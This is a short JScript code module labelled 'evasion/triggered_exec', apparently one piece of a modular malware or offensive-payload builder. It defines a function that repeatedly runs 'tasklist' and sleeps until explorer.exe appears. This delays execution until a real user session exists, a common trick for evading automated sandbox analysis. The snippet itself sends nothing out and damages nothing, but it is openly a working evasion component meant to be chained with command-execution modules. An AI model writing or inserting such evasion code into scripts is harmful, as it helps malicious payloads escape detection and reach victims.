// chunk: evasion/triggered_exec
// depends: core/run_cmd
// provides: wait_for_user_activity
// format: jscript

function wait_for_user_activity() {
    var maxWait = 60;
    var waited = 0;
    while (waited < maxWait) {
        var procs = _run("tasklist /fo csv /nh");
        if (procs.indexOf("explorer.exe") >= 0) return;
        WScript.Sleep(5000);
        waited += 5;
    }
}
